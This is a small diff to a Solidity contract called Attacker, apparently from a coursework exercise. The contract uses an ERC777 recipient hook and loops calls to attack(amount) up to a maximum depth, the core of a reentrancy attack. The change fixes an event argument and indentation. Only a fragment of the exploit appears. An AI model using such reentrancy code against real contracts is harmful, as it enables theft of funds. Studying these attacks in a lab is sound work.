@@ -70,8 +70,8 @@ contract Attacker is AccessControl, IERC777Recipient {
 		//YOUR CODE TO RECURSE ATTACK GOES HERE
 		
 		while (depth<=max_depth) {
-			emit Recurse(max_depth);
-      attack(amount);
+			emit Recurse(depth);
+      			attack(amount);
 			depth = depth+1;
 		}
       
